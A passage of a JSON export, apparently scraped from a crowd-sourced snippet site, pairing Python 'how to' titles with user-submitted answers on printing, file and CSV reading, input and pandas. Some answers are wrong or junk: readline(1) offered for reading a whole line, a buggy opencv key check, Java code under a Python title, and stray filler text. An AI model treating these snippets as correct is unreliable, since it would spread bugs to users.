    "reg_date": "2021-10-12T11:30:42.000Z"
  },
  {
    "id": 1826,
    "keyword": null,
    "link": null,
    "title": " how to print 0 to 10 in python",
    "description": "",
    "reg_date": "2021-10-12T11:30:42.000Z"
  },
  {
    "id": 1827,
    "keyword": null,
    "link": null,
    "title": " how to print 69 in python",
    "description": "print(\"69\")\n",
    "reg_date": "2021-10-12T11:30:42.000Z"
  },
  {
    "id": 1828,
    "keyword": null,
    "link": null,
    "title": " how to print a char of element in list in pyhton",
    "description": "#declaring list myList=[12,'Hello','World!'] #for strings print(myList[1][2]) # output --> l #for numbers temp=str(myList[0]) print(temp[1]) # output --> 2\n",
    "reg_date": "2021-10-12T11:30:42.000Z"
  },
  {
    "id": 1829,
    "keyword": null,
    "link": null,
    "title": " how to print a float with only 2 digits after decimal in python",
    "description": "#to round floats in Python you can use the \"round\" function. ex:  tax = 34.4563 tax = round(tax, 2)  #the number 2 at the end is how many digits are rounded.  #the variable \"tax\" would now be: 34.46\n",
    "reg_date": "2021-10-12T11:30:43.000Z"
  },
  {
    "id": 1830,
    "keyword": null,
    "link": null,
    "title": " how to print a list without brackets and commas python",
    "description": "#How to remove brackets and commas from a list (Python)  #Converts list to a string, strips brackets from new string, then replaces all apostrophes with empty spaces print(str(listData).strip('[]').replace('\\'', ''))\n# you're using Python 3, or appropriate Python 2.x version with from __future__ import print_function then:  data = [7, 7, 7, 7] print(*data, sep='')\n",
    "reg_date": "2021-10-12T11:30:43.000Z"
  },
  {
    "id": 1831,
    "keyword": null,
    "link": null,
    "title": " how to print a random part of a list in python",
    "description": "import random  list = [\"Item 1\", \"Item 2\", \"Item 3\"]\t\t\t# List item = random.choice(list)\t\t\t\t\t\t# Chooses from list print(item)\t\t\t\t\t# Prints choice  # From stackoverflow # Tried and tested method\nimport random  foo = ['a', 'b', 'c', 'd', 'e'] print(random.choice(foo))\nimport random list = [20, 30, 40, 50 ,60, 70, 80] sampling = random.choices(list, k=4)      # Choices with repetition sampling = random.sample(list, k=4)       # Choices without repetition\n",
    "reg_date": "2021-10-12T11:30:43.000Z"
  },
  {
    "id": 1832,
    "keyword": null,
    "link": null,
    "title": " how to print all combinations of a string in python",
    "description": "test_str = \"abc\" res = [test_str[i: j] for i in range(len(test_str))            for j in range(i + 1, len(test_str) + 1)] print(res)#['a', 'ab', 'abc', 'b', 'bc', 'c']\nimport itertools   if __name__ == '__main__':       nums = list(\"ABC\")     permutations = list(itertools.permutations(nums))       # Output: ['ABC', 'ACB', 'BAC', 'BCA', 'CAB', 'CBA']     print([''.join(permutation) for permutation in permutations])\n",
    "reg_date": "2021-10-12T11:30:43.000Z"
  },
  {
    "id": 1833,
    "keyword": null,
    "link": null,
    "title": " how to print all items in a list python",
    "description": ">>> l = [1, 2, 3] >>> print(' '.join(str(x) for x in l)) 1 2 3 >>> print(' '.join(map(str, l))) 1 2 3\nfruits = [\"Apple\",\"Orange\",\"Watermelon\",\"cherry\"] for fruit in fruits:     print(fruit)\nitems = [1,2,3,4,5,6]  #print with [] brackets separated by ',' print(items)  #print using operator print(*items)  #print using for  for i in items:     print(i)      #print using for and len function for i in range(len(items)):     print(items[i])  #you can also add sep and end methods to the print statement accordingly \n# using for loop scores = [11, 12, 13, 14, 15, 16] for score in scores:     print(score)\nfor p in myList:    print p\n",
    "reg_date": "2021-10-12T11:30:43.000Z"
  },
  {
    "id": 1834,
    "keyword": null,
    "link": null,
    "title": " how to print all rows in pandas",
    "description": "pd.set_option('display.max_columns', None)  # or 1000 pd.set_option('display.max_rows', None)  # or 1000 pd.set_option('display.max_colwidth', -1)  # or 199\nwith pd.option_context('display.max_rows', None, 'display.max_columns', None):  # more options can be specified also     print(df)  # u can also use display(df) if using jupyter notebook. # this will automatically set the value options to previos values.\n",
    "reg_date": "2021-10-12T11:30:43.000Z"
  },
  {
    "id": 1835,
    "keyword": null,
    "link": null,
    "title": " how to print alternate numbers in python",
    "description": "list = [1,2,3,4,5] alternate_list = list[::2]  #as we are looking for even indices only, and 2 is the smallest even number #so, using list[::2] slices every second item of the list  for item in alternate_list:   print(item)   #Hope this helps:)\n",
    "reg_date": "2021-10-12T11:30:43.000Z"
  },
  {
    "id": 1836,
    "keyword": null,
    "link": null,
    "title": " how to print char of element in list of pytohn",
    "description": "#declaring list myList=[12,'Hello','World!'] #for strings print(myList[1][2]) # output --> l #for numbers temp=str(myList[0]) print(temp[1]) # output --> 2\narrayOfCharacters = [\"p\", \"y\", \"t\", \"h\", \"o\", \"n\"] string = ''.join(arrayOfCharacters) #output: python\n",
    "reg_date": "2021-10-12T11:30:43.000Z"
  },
  {
    "id": 1837,
    "keyword": null,
    "link": null,
    "title": " how to print date and time in python",
    "description": "from datetime import datetime now = datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))   Output: 2020-06-19 10:34:45\nfrom datetime import datetime now = datetime.now() print(\"date and time now: \", now)  #you can also personalize how the formats, example: dt = now.strftime(\"%d/%m/%Y %H:%M:%S\") print(\"date and time now: \", dt)  #the output will be #date and time now:  22/12/2020 01:19:32\nimport datetime now = datetime.datetime.now() print (\"Current date and time : \") print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))  \nfrom datetime import datetime  now = datetime.now().time().strftime(\"%H:%M:%S\") # time object date = datetime.now().strftime(\"%Y-%m-%d\") # date object print(\"date:\",date) print(\"time =\", now)\nfrom datetime import date  today = date.today() print(\"Today's date:\", today) \n",
    "reg_date": "2021-10-12T11:30:43.000Z"
  },
  {
    "id": 1838,
    "keyword": null,
    "link": null,
    "title": " how to print error in try except python",
    "description": "try:   # some code except Exception as e: \tprint(\"ERROR : \"+str(e))\ntry:   print(\"I will try to print this line of code\") except:   print(\"I will print this line of code if an error is encountered\")\nimport traceback  dict = {'a':3,'b':5,'c':8} try:   print(dict[q])   except:   traceback.print_exc()    # This will trace you back to the line where everything went wrong.  # So in this case you will get back line 5          \ntry:   print(\"I will try to print this line of code\") except ERROR_NAME:   print(\"I will print this line of code if error ERROR_NAME is encountered\")\n>>> def divide(x, y): ...     try: ...         result = x / y ...     except ZeroDivisionError: ...         print(\"division by zero!\") ...     else: ...         print(\"result is\", result) ...     finally: ...         print(\"executing finally clause\") ... >>> divide(2, 1) result is 2.0 executing finally clause >>> divide(2, 0) division by zero! executing finally clause >>> divide(\"2\", \"1\") executing finally clause Traceback (most recent call last):   File \"<stdin>\", line 1, in <module>   File \"<stdin>\", line 3, in divide TypeError: unsupported operand type(s) for /: 'str' and 'str' \nexcept Exception as e:\n",
    "reg_date": "2021-10-12T11:30:43.000Z"
  },
  {
    "id": 1839,
    "keyword": null,
    "link": null,
    "title": " how to print hello world in swift",
    "description": "print(\"Hello World\")\n// Swift \"Hello, World!\" Program  print(\"Hello, World!\") \n",
    "reg_date": "2021-10-12T11:30:44.000Z"
  },
  {
    "id": 1840,
    "keyword": null,
    "link": null,
    "title": " how to print hostname in python",
    "description": "# Use socket and its gethostname() functionality.  # This will get the hostname of the computer where the Python interpreter is running: import socket print(socket.gethostname())\n",
    "reg_date": "2021-10-12T11:30:44.000Z"
  },
  {
    "id": 1841,
    "keyword": null,
    "link": null,
    "title": " how to print in lua",
    "description": "print(\"Hello World!\")\n-- print \"Hello, World!  print(\"Hello, World!\")  -- or  x = \"Hello, World!\" print(x)\nprint(\"Your Text here\")\nprint(\"text here\")  -- or  extra = \"more text\"  print(\"text here \" .. extra)\nprint(\"text\"..v) -- \"\" for strings, '..' to concencate, type name of variable to print variable\nasdasd\n",
    "reg_date": "2021-10-12T11:30:44.000Z"
  },
  {
    "id": 1842,
    "keyword": null,
    "link": null,
    "title": " how to print in pyhton",
    "description": "print(\"whatever you want to print\")\nprint(\"Hello World!\")\nprint(\"Write in here whatsoever you want to print\")\ndef i_will_print_with_a_diffrent_function(x):   print(x) i_will_print_with_a_diffrent_function(\"my name\")\nprint('This is how to print a statement in python')\nprint(\"HIIII\") ssssssssssssssssssss\n",
    "reg_date": "2021-10-12T11:30:44.000Z"
  },
  {
    "id": 1843,
    "keyword": null,
    "link": null,
    "title": " how to print in python",
    "description": "print(\"Hello World\")\n# How to print in Python print('Hello World!') # or print(\"Hello World\") # and with a space like this: print ('Hello World')\nprint(\"The text you want\")\n''' print()inside the parentheses put a single colon or double colon  ''' # example like this print(\"this how you use print statement\") # or like this print('other way to print in python')\nprint(\"YOURTEXT\")\n#a string, to indicate it is a string you can use (\"\") or ('') print(\"hello world\") #a integer  print(19) # a float: print(4.5)\nprint(\"what you want to print\")\nprint(\"anything\")\n#('') a string, to indicate it is a string you can use (\"\") or ('') print(\"hello world\") #a integer  print(19) # a float: print(4.5) # a bool: print (True) print (False)\n''' print - > this is a statement use brackets and quotation marks (\"\") or ('') whatever you want to say put in the brackets ''' print(\"Hello World\")\n",
    "reg_date": "2021-10-12T11:30:44.000Z"
  },
  {
    "id": 1844,
    "keyword": null,
    "link": null,
    "title": " how to print items in a list in a single line python",
    "description": ">>> l = [1, 2, 3] >>> print(' '.join(str(x) for x in l)) 1 2 3 >>> print(' '.join(map(str, l))) 1 2 3\n",
    "reg_date": "2021-10-12T11:30:44.000Z"
  },
  {
    "id": 1845,
    "keyword": null,
    "link": null,
    "title": " how to print me me big boy python",
    "description": "print(\"Me me big boy\")\n",
    "reg_date": "2021-10-12T11:30:44.000Z"
  },
  {
    "id": 1846,
    "keyword": null,
    "link": null,
    "title": " how to print not equal to in python",
    "description": "!= #is not equal to\n",
    "reg_date": "2021-10-12T11:30:44.000Z"
  },
  {
    "id": 1847,
    "keyword": null,
    "link": null,
    "title": " how to print numbers from 1 to 20 in python",
    "description": "for i in range(1, 21):     print(i)\n",
    "reg_date": "2021-10-12T11:30:44.000Z"
  },
  {
    "id": 1848,
    "keyword": null,
    "link": null,
    "title": " how to print on python",
    "description": "print(\"whatever you want to print\")\nprint(\"Hello World!\")\nprint(\"hello guys\")\nprint(\"Write in here whatsoever you want to print\")\na = 5 print('The value of a is', a)\n# Name Harry = \"Harry\" # Age my_age = 8 # Math Problem math = 4 problem = 9 print(Harry,my_age,math * problem)\n",
    "reg_date": "2021-10-12T11:30:44.000Z"
  },
  {
    "id": 1849,
    "keyword": null,
    "link": null,
    "title": " how to print palindrome in 100 between 250 in python",
    "description": ">>> def isPalindrome(s):     ''' check if a number is a Palindrome '''     s = str(s)     return s == s[::-1]  >>> def generate_palindrome(minx,maxx):     ''' return a list of Palindrome number in a given range '''     tmpList = []     for i in range(minx,maxx+1):         if isPalindrome(i):             tmpList.append(i)      return tmpList  >>> generate_palindrome(1,120)  [1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 22, 33, 44, 55, 66, 77, 88, 99, 101, 111] \n",
    "reg_date": "2021-10-12T11:30:45.000Z"
  },
  {
    "id": 1850,
    "keyword": null,
    "link": null,
    "title": " how to print python",
    "description": "print(\"whatever you want to print\")\nprint(\"Hello World!\")\nprint(\"Hello World\")\nprint(\"hello guys\")\nprint('Hello, world!')\nprint(\"What you would like to print\")\n",
    "reg_date": "2021-10-12T11:30:45.000Z"
  },
  {
    "id": 1851,
    "keyword": null,
    "link": null,
    "title": " how to print something in python",
    "description": "print(\"whatever you want to print\")\nprint(\"Hello World!\")\nprint(\"hello guys\")\nprint(\"HIIII\") ssssssssssssssssssss\nprint('hello world')\nprint(\"dog\")\n",
    "reg_date": "2021-10-12T11:30:45.000Z"
  },
  {
    "id": 1852,
    "keyword": null,
    "link": null,
    "title": " how to print something with tkinter",
    "description": "label_b = tk.Label(     text=\"TEXT HERE\",     fg=\"white\",     bg=\"black\",     width=120,     height=3, ) label_b.pack\n",
    "reg_date": "2021-10-12T11:30:45.000Z"
  },
  {
    "id": 1853,
    "keyword": null,
    "link": null,
    "title": " how to print text after an interger",
    "description": "print(\"The text you want\" + str(var) + \"to print\")\nprint(\"The text you want to print\")\n",
    "reg_date": "2021-10-12T11:30:45.000Z"
  },
  {
    "id": 1854,
    "keyword": null,
    "link": null,
    "title": " how to print text messages lua",
    "description": "print(\"Hello World!\")\n",
    "reg_date": "2021-10-12T11:30:45.000Z"
  },
  {
    "id": 1855,
    "keyword": null,
    "link": null,
    "title": " how to print the square root of a number in python",
    "description": "from math import * # We import the math module print(sqrt(16)) # We print the square root of the number 16\nimport math  toSquare = 300 squared = math.sqrt(toSquare) \nx = 9 y = x ** 0.5\nimport math answer = math.sqrt(16)\n",
    "reg_date": "2021-10-12T11:30:45.000Z"
  },
  {
    "id": 1856,
    "keyword": null,
    "link": null,
    "title": " how to print time python 3",
    "description": "import datetime now = datetime.datetime.now() print (now.strftime(\"%Y-%m-%d %H:%M:%S\")) # key: https://strftime.org/\n",
    "reg_date": "2021-10-12T11:30:45.000Z"
  },
  {
    "id": 1857,
    "keyword": null,
    "link": null,
    "title": " how to print whole year calendar in python",
    "description": "# importing the calendar module import calendar # initializing the year year = 2020 # printing the calendar print(calendar.calendar(year))\n",
    "reg_date": "2021-10-12T11:30:45.000Z"
  },
  {
    "id": 1858,
    "keyword": null,
    "link": null,
    "title": " how to program",
    "description": "print(\"don't be lazy just do it, the end is rewarding\")\nWelcome to the programming Community Enjoy!\nWatch a tutorial;\n",
    "reg_date": "2021-10-12T11:30:45.000Z"
  },
  {
    "id": 1859,
    "keyword": null,
    "link": null,
    "title": " how to pronounce aesthetic",
    "description": "print('yo sup bro') \n",
    "reg_date": "2021-10-12T11:30:46.000Z"
  },
  {
    "id": 1860,
    "keyword": null,
    "link": null,
    "title": " how to put a text file into a list python",
    "description": "# name.txt david mary john   with open('names.txt', 'r') as f:     myNames = [line.strip() for line in f]      # Result  ['david','mary','john']\nwith open('file1.txt','r') as f: \tlistl=[] \tfor line in f: \t\tstrip_lines=line.strip() \t\tlistli=strip_lines.split() \t\tprint(listli) \t\tm=listl.append(listli) \tprint(listl)\n",
    "reg_date": "2021-10-12T11:30:46.000Z"
  },
  {
    "id": 1861,
    "keyword": null,
    "link": null,
    "title": " how to put iput python",
    "description": "input('something ')\n# Python 2  txt = raw_input(\"Type something to test this out: \") print \"Is this what you just said?\", txt \n",
    "reg_date": "2021-10-12T11:30:46.000Z"
  },
  {
    "id": 1862,
    "keyword": null,
    "link": null,
    "title": " how to python hack 2021 course",
    "description": "Print = 'hi'\n",
    "reg_date": "2021-10-12T11:30:46.000Z"
  },
  {
    "id": 1863,
    "keyword": null,
    "link": null,
    "title": " how to raise a error in python",
    "description": "# You can raise a error in python by using the raise keyword raise Exception(\"A error occured!\")\nraise Exception(\"message\")\nraise Exception('I know Python!') # Don't! If you catch, likely to hide bugs. \ndef prefill(n,v):     try:         n = int(n)     except ValueError:         raise TypeError(\"{0} is invalid\".format(n))     else:         return [v] * n\n# There are 3 approaches, the first as lvc mentioned is using sys.exit sys.exit('My error message')  # The second way is using print, print can write almost anything including an error message print >>sys.stderr, \"fatal error\"     # Python 2.x print(\"fatal error\", file=sys.stderr) # Python 3.x  # The third way is to rise an exception which I don't like because it can be try-catch raise SystemExit('error in code want to exit')  # it can be ignored like this try:   raise SystemExit('error in code want to exit') except:   print(\"program is still open\")\nclass MyError(TypeError):     pass  raise MyError('An error happened')\n",
    "reg_date": "2021-10-12T11:30:46.000Z"
  },
  {
    "id": 1864,
    "keyword": null,
    "link": null,
    "title": " how to randomly choose from a list python",
    "description": "random.choice(name of list)\n",
    "reg_date": "2021-10-12T11:30:46.000Z"
  },
  {
    "id": 1865,
    "keyword": null,
    "link": null,
    "title": " how to re run code in python",
    "description": "restart=1 while restart!= \"x\": [your game here] input(\"press any key to start again, or x to exit.\") Here is a template you can use to re-run a block of code. Think of #code as a placeholder for one or more lines of Python code.\n",
    "reg_date": "2021-10-12T11:30:46.000Z"
  },
  {
    "id": 1866,
    "keyword": null,
    "link": null,
    "title": " how to read a CSV file line by line with or without header in python",
    "description": "#Read a CSV file line by line using csv.reader  #Suppose we have a csv file students.csv and its contents are, Id,Name,Course,City,Session 21,Mark,Python,London,Morning 22,John,Python,Tokyo,Evening 23,Sam,Python,Paris,Morning 32,Shaun,Java,Tokyo,Morning  #With csv module&rsquo;s reader class object we can iterate over the lines of a csv file as a list of values, where each value in the list is a cell value. Let&rsquo;s understand with an example,  from csv import reader # open file in read mode with open('students.csv', 'r') as read_obj:     # pass the file object to reader() to get the reader object     csv_reader = reader(read_obj)     # Iterate over each row in the csv using reader object     for row in csv_reader:         # row variable is a list that represents a row in csv         print(row)  Output: ['Id', 'Name', 'Course', 'City', 'Session'] ['21', 'Mark', 'Python', 'London', 'Morning'] ['22', 'John', 'Python', 'Tokyo', 'Evening'] ['23', 'Sam', 'Python', 'Paris', 'Morning'] ['32', 'Shaun', 'Java', 'Tokyo', 'Morning']\n#Get column names from header in csv file  #Suppose we have a csv file students.csv and its contents are, Id,Name,Course,City,Session 21,Mark,Python,London,Morning 22,John,Python,Tokyo,Evening 23,Sam,Python,Paris,Morning 32,Shaun,Java,Tokyo,Morning  #DictReader class has a member function that returns the column names of the csv file as list. #let&rsquo;s see how to use it,  from csv import DictReader # open file in read mode with open('students.csv', 'r') as read_obj:     # pass the file object to DictReader() to get the DictReader object     csv_dict_reader = DictReader(read_obj)     # get column names from a csv file     column_names = csv_dict_reader.fieldnames     print(column_names)  Output: ['Id', 'Name', 'Course', 'City', 'Session']\n#Read specific columns from a csv file while iterating line by line  #Suppose we have a csv file students.csv and its contents are, Id,Name,Course,City,Session 21,Mark,Python,London,Morning 22,John,Python,Tokyo,Evening 23,Sam,Python,Paris,Morning 32,Shaun,Java,Tokyo,Morning   #Read specific columns (by column name) in a csv file while iterating row by row   #Iterate over all the rows of students.csv file line by line, but print only two columns of for each row,  from csv import DictReader # iterate over each line as a ordered dictionary and print only few column by column name with open('students.csv', 'r') as read_obj:     csv_dict_reader = DictReader(read_obj)     for row in csv_dict_reader:         print(row['Id'], row['Name'])  Output: 21 Mark 22 John 23 Sam 32 Shaun   #Read specific columns (by column Number) in a csv file while iterating row by row   #Iterate over all rows students.csv and for each row print contents of 2ns and 3rd column,  from csv import reader # iterate over each line as a ordered dictionary and print only few column by column Number with open('students.csv', 'r') as read_obj:     csv_reader = reader(read_obj)     for row in csv_reader:         print(row[1], row[2])  Output: Name Course Mark Python John Python Sam Python Shaun Java \n#Read a CSV file line by line using csv module DictReader object  #Suppose we have a csv file students.csv and its contents are, Id,Name,Course,City,Session 21,Mark,Python,London,Morning 22,John,Python,Tokyo,Evening 23,Sam,Python,Paris,Morning 32,Shaun,Java,Tokyo,Morning  #With csv module&rsquo;s DictReader class object we can iterate over the lines of a csv file as a dictionary i.e. #for each row a dictionary is returned, which contains the pair of column names and cell values for that row. #Let&rsquo;s understand with an example,  from csv import DictReader # open file in read mode with open('students.csv', 'r') as read_obj:     # pass the file object to DictReader() to get the DictReader object     csv_dict_reader = DictReader(read_obj)     # iterate over each line as a ordered dictionary     for row in csv_dict_reader:         # row variable is a dictionary that represents a row in csv         print(row)  Output: {'Id': '21', 'Name': 'Mark', 'Course': 'Python', 'City': 'London', 'Session': 'Morning'} {'Id': '22', 'Name': 'John', 'Course': 'Python', 'City': 'Tokyo', 'Session': 'Evening'} {'Id': '23', 'Name': 'Sam', 'Course': 'Python', 'City': 'Paris', 'Session': 'Morning'} {'Id': '32', 'Name': 'Shaun', 'Course': 'Java', 'City': 'Tokyo', 'Session': 'Morning'}\n#Read a CSV file without header  #Suppose we have a csv file students.csv and its contents are, Id,Name,Course,City,Session 21,Mark,Python,London,Morning 22,John,Python,Tokyo,Evening 23,Sam,Python,Paris,Morning 32,Shaun,Java,Tokyo,Morning  #In the previous example we iterated through all the rows of csv file including header. But suppose we want to skip the header and iterate over the remaining rows of csv file. #Let&rsquo;s see how to do that,  from csv import reader # skip first line i.e. read header first and then iterate over each row od csv as a list with open('students.csv', 'r') as read_obj:     csv_reader = reader(read_obj)     header = next(csv_reader)     # Check file as empty     if header != None:         # Iterate over each row after the header in the csv         for row in csv_reader:             # row variable is a list that represents a row in csv             print(row)  Output: ['21', 'Mark', 'Python', 'London', 'Morning'] ['22', 'John', 'Python', 'Tokyo', 'Evening'] ['23', 'Sam', 'Python', 'Paris', 'Morning'] ['32', 'Shaun', 'Java', 'Tokyo', 'Morning'] Header was:  ['Id', 'Name', 'Course', 'City', 'Session']\n",
    "reg_date": "2021-10-12T11:30:46.000Z"
  },
  {
    "id": 1867,
    "keyword": null,
    "link": null,
    "title": " how to read a file into array in python",
    "description": "def readFile(fileName):         fileObj = open(fileName, \"r\") #opens the file in read mode         words = fileObj.read().splitlines() #puts the file into an array         fileObj.close()         return words\n",
    "reg_date": "2021-10-12T11:30:46.000Z"
  },
  {
    "id": 1868,
    "keyword": null,
    "link": null,
    "title": " how to read a json resposnse from a link in python",
    "description": "import urllib, json  url = \"put url here\" response = urllib.request.urlopen(url) data = json.loads(response.read()) print (data)\nimport requests r = requests.get('url') print r.json()\n",
    "reg_date": "2021-10-12T11:30:47.000Z"
  },
  {
    "id": 1869,
    "keyword": null,
    "link": null,
    "title": " how to read docx file in python",
    "description": "import docx2txt my_text = docx2txt.process(\"test.docx\") print(my_text) \n",
    "reg_date": "2021-10-12T11:30:47.000Z"
  },
  {
    "id": 1870,
    "keyword": null,
    "link": null,
    "title": " how to read excel file in jupyter notebook",
    "description": "import pandas as pd  df = pd.read_excel (r'Path where the Excel file is stored\\File name.xlsx', sheet_name='your Excel sheet name') print (df) \nimport pandas as pd  df = pd.read_excel (r'Path where the Excel file is stored\\File name.xlsx', sheet_name='your Excel sheet name') print (df)\n",
    "reg_date": "2021-10-12T11:30:47.000Z"
  },
  {
    "id": 1871,
    "keyword": null,
    "link": null,
    "title": " how to read first column of csv intro a list python",
    "description": "with open(\"mylist.csv\") as f:     list2 = [row.split()[0] for row in f]\n",
    "reg_date": "2021-10-12T11:30:47.000Z"
  },
  {
    "id": 1872,
    "keyword": null,
    "link": null,
    "title": " how to read from a file into a list in python",
    "description": "text_file = open(\"filename.dat\", \"r\") lines = text_file.readlines() print lines print len(lines) text_file.close()\nf = open(filename, \"r\")    listItems = f.read().splitlines() \nf = open(filename, \"r\")    listItems = f.read().splitlines()\n",
    "reg_date": "2021-10-12T11:30:47.000Z"
  },
  {
    "id": 1873,
    "keyword": null,
    "link": null,
    "title": " how to read iris data in python",
    "description": "print(__doc__)   # Code source: Ga&euml;l Varoquaux # Modified for documentation by Jaques Grobler # License: BSD 3 clause  import matplotlib.pyplot as plt from mpl_toolkits.mplot3d import Axes3D from sklearn import datasets from sklearn.decomposition import PCA  # import some data to play with iris = datasets.load_iris() X = iris.data[:, :2]  # we only take the first two features. y = iris.target  x_min, x_max = X[:, 0].min() - .5, X[:, 0].max() + .5 y_min, y_max = X[:, 1].min() - .5, X[:, 1].max() + .5  plt.figure(2, figsize=(8, 6)) plt.clf()  # Plot the training points plt.scatter(X[:, 0], X[:, 1], c=y, cmap=plt.cm.Set1,             edgecolor='k') plt.xlabel('Sepal length') plt.ylabel('Sepal width')  plt.xlim(x_min, x_max) plt.ylim(y_min, y_max) plt.xticks(()) plt.yticks(())  # To getter a better understanding of interaction of the dimensions # plot the first three PCA dimensions fig = plt.figure(1, figsize=(8, 6)) ax = Axes3D(fig, elev=-150, azim=110) X_reduced = PCA(n_components=3).fit_transform(iris.data) ax.scatter(X_reduced[:, 0], X_reduced[:, 1], X_reduced[:, 2], c=y,            cmap=plt.cm.Set1, edgecolor='k', s=40) ax.set_title(\"First three PCA directions\") ax.set_xlabel(\"1st eigenvector\") ax.w_xaxis.set_ticklabels([]) ax.set_ylabel(\"2nd eigenvector\") ax.w_yaxis.set_ticklabels([]) ax.set_zlabel(\"3rd eigenvector\") ax.w_zaxis.set_ticklabels([])  plt.show() \n",
    "reg_date": "2021-10-12T11:30:47.000Z"
  },
  {
    "id": 1874,
    "keyword": null,
    "link": null,
    "title": " how to read multiple worksheet from a single workbook in column in python",
    "description": "import pandas as pd  def read_excel_sheets(xls_path):     \"\"\"Read all sheets of an Excel workbook and return a single DataFrame\"\"\"     print(f'Loading {xls_path} into pandas')     xl = pd.ExcelFile(xls_path)     df = pd.DataFrame()     columns = None     for idx, name in enumerate(xl.sheet_names):         print(f'Reading sheet #{idx}: {name}')         sheet = xl.parse(name)         if idx == 0:             # Save column names from the first sheet to match for append             columns = sheet.columns         sheet.columns = columns         # Assume index of existing data frame when appended         df = df.append(sheet, ignore_index=True)     return df \nxls = pd.ExcelFile('path_to_file.xls') df1 = pd.read_excel(xls, 'Sheet1') df2 = pd.read_excel(xls, 'Sheet2')\nimport pandas as pd  df = pd.read_excel(excel_file_path, sheetname=\"sheet_name\") \nstops = read_excel_sheets(\"data/PIALog_through-20171231.xlsx\") \nstops2 = read_excel_sheets(\"data/PIANorthCarolina_02152019.xlsx\") stops2.to_csv(\"data/stops.01end.csv\", mode=\"a\", header=False, index=False) \nstops.to_csv(\"data/stops.01end.csv\", index=False) \n",
    "reg_date": "2021-10-12T11:30:47.000Z"
  },
  {
    "id": 1875,
    "keyword": null,
    "link": null,
    "title": " how to read mysql table in python",
    "description": "import pandas as pd import sqlalchemy  # make sure you have installed both mysql & pymysql  \t\t\t\t\t\t\t\t\t\t\t\t\t# root:root is my username and password/default engine = sqlalchemy.create_engine(\"mysql+pymysql://root:root@localhost/database name\", pool_pre_ping=True) # then specify the name of the table in the database df = pd.read_sql_table('table name', engine) print(df)\n# for those who can't see all columns in the # output when getting data from database  # just paste in the following code and that should be fixed pd.set_option('display.max_rows', None) pd.set_option('display.max_columns', None) pd.set_option('display.width', None) pd.set_option('display.max_colwidth', None)\ncursor.fetchall()\n",
    "reg_date": "2021-10-12T11:30:47.000Z"
  },
  {
    "id": 1876,
    "keyword": null,
    "link": null,
    "title": " how to read the first line in a file python",
    "description": "f = open(\"test.txt\", 'r') variable = f.readline(1) print(variable)\nprivate ArrayList<String> readFileLines(String filepath) throws FileNotFoundException, IOException{   File fp = new File(filepath);   FileReader fr = new FileReader(fp);   BufferedReader br = new BufferedReader(fr);    ArrayList<String> lines = new ArrayList<>();   String line;   while((line = br.readLine()) != null) { lines.add(line); }    fr.close();   return lines; }\n# attempt #1 f = open(\"Bills.txt\", \"w\") f.write(\"\\n\".join(map(lambda x: str(x), bill_List))) f.close()   # attempt #2 # Open a file in write mode f = open('Bills.txt', 'w') for item in bill_List: f.write(\"%s\\n\" % item) # Close opend file f.close()  # attempt #3  with open('Bills.txt', 'w') as f: for s in bill_List:     f.write(s + '\\n')  with open('Bills.txt', 'r') as f: bill_List = [line.rstrip('\\n') for line in f]  # attempt #4 with open('Bills.txt', 'w') as out_file: out_file.write('\\n'.join(     bill_List)) \n",
    "reg_date": "2021-10-12T11:30:47.000Z"
  },
  {
    "id": 1877,
    "keyword": null,
    "link": null,
    "title": " how to read tsv file python",
    "description": "with open(\"file.tsv\") as fd:     rd = csv.reader(fd, delimiter=\"\\t\", quotechar='\"')     for row in rd:         print(row)\nTime                ID_1    ID_2                2020-02-25 09:24:14 140209  81625000 2020-02-25 09:24:14 140216  91625000 2020-02-25 09:24:18 140219  80250000 2020-02-25 09:24:18 140221  90250000 25/02/2020 09:42:02     143982  39075000\n",
    "reg_date": "2021-10-12T11:30:47.000Z"
  },
  {
    "id": 1878,
    "keyword": null,
    "link": null,
    "title": " how to read value in tuple",
    "description": "tuple1 = (1,2,3) element = tuple1[0] #first element, same as list\n",
    "reg_date": "2021-10-12T11:30:48.000Z"
  },
  {
    "id": 1879,
    "keyword": null,
    "link": null,
    "title": " how to read video in opencv python",
    "description": "import numpy as np import cv2 cap = cv2.VideoCapture('videos/wa.avi') while(cap.isOpened()):   ret, frame = cap.read()   gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)   cv2.imshow('frame',gray)   if cv2.waitKey(1) & 0xFF == ord('q'):     break  cap.release() cv2.destroyAllWindows()\nimport cv2 frameWidth = 640 frameHeight = 480 cap = cv2.VideoCapture(\"Resources/test_ video.mp4\") while True:     success, img = cap.read()     img = cv2.resize(img, (frameWidth, frameHeight))     cv2.imshow(\"Result\", img)     if cv2.waitKey(1) and 0xFF == ord('q'):          break \n",
    "reg_date": "2021-10-12T11:30:48.000Z"
  },
  {
    "id": 1880,
    "keyword": null,
    "link": null,
    "title": " how to read zip csv file in python",
    "description": "import pandas as pd import zipfile  zf = zipfile.ZipFile('C:/Users/Desktop/THEZIPFILE.zip')  # if you want to see all files inside zip folder zf.namelist()  # now read your csv file  df = pd.read_csv(zf.open('intfile.csv'))\n",
    "reg_date": "2021-10-12T11:30:48.000Z"
  },
  {
    "id": 1881,
    "keyword": null,
    "link": null,
    "title": " how to receive input from user in python",
    "description": "var = input(\"Text: \")\n",
    "reg_date": "2021-10-12T11:30:48.000Z"
  },
  {
    "id": 1882,
    "keyword": null,
    "link": null,
    "title": " how to receive password using tkinter entry",
    "description": "from tkinter import * master = Tk() password = Entry(master, show = '*').pack() ...\n",
    "reg_date": "2021-10-12T11:30:48.000Z"
  },
  {
    "id": 1883,
    "keyword": null,
    "link": null,
    "title": " how to receive user input in python",
    "description": "var = input(\"Text: \")\nname = input(\"Hi! What&rsquo;s your name ? \") print(\"Nice to meet you \" + name + \"!\")  age = input(\"How old are you ? \")  print(\"So, you are already \" + str(age) + \" years old, \" + name + \" !\")\n",
    "reg_date": "2021-10-12T11:30:48.000Z"
  },
  {
    "id": 1884,
    "keyword": null,
    "link": null,
    "title": " how to record execution time in python",
    "description": "import time  start = time.time() print(\"hello\") end = time.time() print(end - start)\nimport time start_time = time.time() main() print(\"--- %s seconds ---\" % (time.time() - start_time))\n",
    "reg_date": "2021-10-12T11:30:48.000Z"
  },
  {
    "id": 1885,
    "keyword": null,
    "link": null,
    "title": " how to record the steps of mouse and play the steps using python",
    "description": "import mouse inportance = mouse.record(\"right\") mouse.play(inportance)\n",
    "reg_date": "2021-10-12T11:30:48.000Z"
  },
